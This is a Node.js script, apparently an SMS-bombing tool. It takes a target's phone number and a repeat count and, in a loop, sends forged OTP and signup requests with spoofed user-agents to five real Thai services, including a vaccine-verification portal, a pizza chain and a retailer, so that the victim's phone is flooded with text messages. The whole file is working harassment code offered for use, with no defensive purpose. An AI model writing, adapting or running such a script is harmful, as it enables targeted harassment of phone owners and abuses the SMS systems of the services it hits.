const axios = require("axios")
const formUrlEncoded = x =>
Object.keys(x).reduce((p, c) => p + `&${c}=${encodeURIComponent(x[c])}`, '')

var phonee = process.argv[2];
var count = process.argv[3];

for (var i = 0; i < count; i++){
    cckspam(phonee)
    uqee168(phonee)
    pizza_spam(phonee)
    nocnoc(phonee)
    vcc(phonee)
}

async function vcc(phonee){
    try{
        var send = await axios({
            method:"POST",
            url:"https://vaccine.trueid.net/vacc-verify/api/getotp",
            headers: {
                'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40',
            },
            data: {
                "msisdn":phonee,
                "function":"enroll",
            }
        })
 		console.log("vcc : SUCCESS")
	}catch(e){
		console.log("vcc : ERROR")
	}
}


async function nocnoc(phonee){
    try{
        var result = await axios({
            method:"POST",
            url:"https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.689",
            headers: { 
                'content-type': 'application/json; charset=utf-8',
				'user-agent': 'Mozilla/5.0 (Linux; Android 10; Infinix X692) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
			},
            data:{
                "lang": "th",
                "userType": "BUYER",
                "locale": "th",
                "orgIdfier": "scg",
                "phone": "+66"+phonee.substring(1, 10),
                "type": "signup",
                "otpTemplate": "buyer_signup_otp_message",
                "userParams": {
                "buyerName": randomstr(32),
                }
            }
		})
		console.log("noc : SUCCESS")
	}catch(e){
		console.log("noc : ERROR")
	}
}


async function pizza_spam(phonee){
	try{
		var result = await axios({
			method:"POST",
			url:"https://api2.1112.com/api/v1/otp/create",
			data:{
				language: "th",
				phonenumber: phonee,
			}
		})
		console.log("PIZZA : SUCCESS")
	}catch(e){
		console.log("PIZZA : ERROR")
	}
}

async function uqee168(phonee){
    try{
        var send = await axios({
            method:"POST",
            url:"https://queenclub88.com/api/register/phone",
            data:{
                   phone:phonee,
            }
        })
 		console.log("SET : SUCCESS")
	}catch(e){
		console.log("SET : ERROR")
	}
}


async function cckspam(phonee){
    try{
        var send = await axios({
            method:"POST",
            url:"https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
            data:{username: phonee,
                  password:"1111a1111A",
                  name: randomstr(32),
                  provinceCode:"74",
                  districtCode:"970",
                  subdistrictCode:"8654",
                  zipcode:"94140",
                  siebelCustomerTypeId:"710",
                  locale:"th_TH",
             headers: {
                 'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N960N Build/LMY49I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Safari/537.36gpminiapp',
                 }
             }
		})
		console.log("HEE : SUCCESS")
	}catch(e){
		console.log("HEET : ERROR")
	}
}

function randomnumber(length) {
	var result           = '';
	var characters       = '123456789';
	var charactersLength = characters.length;
	for ( var i = 0; i < length; i++ ) {
		result += characters.charAt(Math.floor(Math.random() * 
			charactersLength));
	}
	return result;
}

function randomstr(length) {
	var result           = '';
	var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789';
	var charactersLength = characters.length;
	for ( var i = 0; i < length; i++ ) {
		result += characters.charAt(Math.floor(Math.random() * 
			charactersLength));
	}
	return result;
}
